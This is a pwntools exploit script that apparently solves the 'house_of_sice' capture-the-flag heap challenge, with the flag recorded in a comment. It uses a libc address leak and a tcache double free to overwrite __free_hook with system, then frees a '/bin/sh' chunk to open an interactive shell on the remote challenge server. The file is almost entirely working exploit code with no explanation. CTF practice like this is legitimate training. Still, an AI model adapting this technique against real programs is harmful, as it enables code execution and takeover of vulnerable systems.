#flag = flag{tfw_the_double_free_check_still_sucks}
from pwn import *

elf = ELF("./house_of_sice")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
target = remote("house-of-sice.hsc.tf", 1337)

def sa( d):
    target.sendafter(">", d)

def purchase(number=0x1337, deet=1):
    sa("1")
    sa(str(deet))
    sa(str(number))

def sell(idx):
    sa("2")
    sa(str(idx))


target.recvuntil("complimentary deet: ")
libc_base = int(target.recvline().strip(), 0x10) - (0x7f1c27425410 - 0x00007f1c273d0000) # 0x00007f1c273f5000
log.info("LIBC Base: " + hex(libc_base))

for i in range(8):
    purchase()

for i in range(8):
    sell(i)

purchase()
sell(7)

purchase(libc_base + libc.sym['__free_hook'], 2)
purchase(u64("/bin/sh\x00"))
purchase(libc_base + libc.sym['system'])

sell(10)

target.interactive()